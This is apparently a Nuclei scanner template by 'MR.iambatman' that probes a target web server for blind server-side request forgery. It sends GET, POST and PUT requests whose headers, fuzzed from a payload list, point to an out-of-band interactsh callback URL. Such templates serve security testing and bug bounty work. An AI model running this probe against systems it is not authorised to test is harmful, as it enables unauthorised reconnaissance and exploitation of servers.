id: Blind-SSRF
info:
  name: Blind_ssrf
  author: MR.iambatman
  severity: high
  description: ssrf
requests:
  - raw:
      - "GET / HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\n§header§: https://{{interactsh-url}}\n \n"
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
        §header§: https://{{interactsh-url}}
      - |
        PUT / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
        §header§: https://{{interactsh-url}}
    payloads:
      header: helpers/payloads/request-headers.txt
    attack: clusterbomb
    redirects: true
